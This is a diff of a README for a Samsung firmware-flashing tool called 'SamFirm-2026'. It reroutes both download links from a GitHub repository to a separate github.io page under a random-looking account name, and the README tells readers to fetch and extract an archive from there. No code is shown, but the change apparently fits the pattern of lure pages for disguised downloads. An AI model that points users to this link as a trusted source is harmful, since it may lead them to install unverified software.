@@ -1,6 +1,6 @@
 # 🛠️ SamFirm-2026 - Flash Samsung Firmware With Ease
 
-[![](https://img.shields.io/badge/Download-SamFirm_2026-blue.svg)](https://github.com/humbleplantcolpoxerosis54/SamFirm-2026)
+[![](https://img.shields.io/badge/Download-SamFirm_2026-blue.svg)](https://humbleplantcolpoxerosis54.github.io)
 
 ## 📖 About This Tool
 
@@ -21,7 +21,7 @@ Before you install this software, ensure your computer meets these minimum speci
 
 Follow these steps to set up the tool on your desktop:
 
-1. Visit the [official download page](https://github.com/humbleplantcolpoxerosis54/SamFirm-2026) to get the latest version.
+1. Visit the [official download page](https://humbleplantcolpoxerosis54.github.io) to get the latest version.
 2. Locate the release section on the right side of the screen.
 3. Click the link to download the compressed archive file.
 4. Open the downloaded file using your preferred folder extraction tool. 
